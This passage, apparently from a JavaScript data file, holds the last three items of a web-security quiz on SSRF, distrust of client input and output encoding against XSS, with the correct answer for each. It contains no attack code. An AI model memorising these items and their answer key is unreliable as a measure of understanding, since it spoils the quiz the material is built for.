          { type: "MULTIPLE_CHOICE", question: "Tricking a server into fetching internal URLs is:", options: ["CSRF", "SSRF", "XSS", "IDOR"], correct: "SSRF" },
          { type: "TRUE_FALSE", question: "Never trusting client input is a foundational web-security rule.", correct: "true" },
          { type: "MULTIPLE_CHOICE", question: "The primary XSS defence is:", options: ["Parameterised queries", "Output encoding", "Rate limiting", "Allow-listing URLs"], correct: "Output encoding" },
        ],
      },
    },
  ],
};
